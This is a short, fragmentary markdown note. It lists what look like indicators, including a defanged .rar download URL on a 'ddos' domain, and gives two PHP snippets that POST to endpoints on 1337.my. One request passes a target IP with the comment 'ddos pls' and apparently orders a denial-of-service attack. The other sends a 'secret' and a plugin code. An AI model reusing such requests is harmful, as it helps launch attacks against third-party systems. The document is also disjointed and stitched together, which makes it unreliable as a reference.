## AS KNOWN
- id-rsassa-pkcs1-v1_5-with-sha3-2 24.1.1
- encryptedprivatekeyinfo
- http://ddos.dnsnb8[.]net/cj/k1.rar

# SNIPPET 1

```
<?php

$client = new http\Client;
$request = new http\Client\Request;

$body = new http\Message\Body;
$body->append(new http\QueryString([
  'data1' => '1337',
  'data2' => '1337',
  'data3' => '192.168.0.1', # ddos pls
  'data4' => '0'
]));

$request->setRequestUrl('https://1337.my/client/client.php');
$request->setRequestMethod('POST');
$request->setBody($body);

$request->setHeaders([
  'host' => '1337.my',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded'
]);

$client->enqueue($request)->send();
$response = $client->getResponse();

echo $response->getBody();
```

# SNIPPET 2

```
<?php

$request = new HttpRequest();
$request->setUrl('https://1337.my/api/code');
$request->setMethod(HTTP_METH_POST);

$request->setHeaders([
  'host' => '1337.my',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded'
]);

$request->setContentType('application/x-www-form-urlencoded');
$request->setPostFields([
  'secret' => 'SECRET RECIPE',
  'plugincode' => '1337'
]);

try {
  $response = $request->send();

  echo $response->getBody();
} catch (HttpException $ex) {
  echo $ex;
}
```
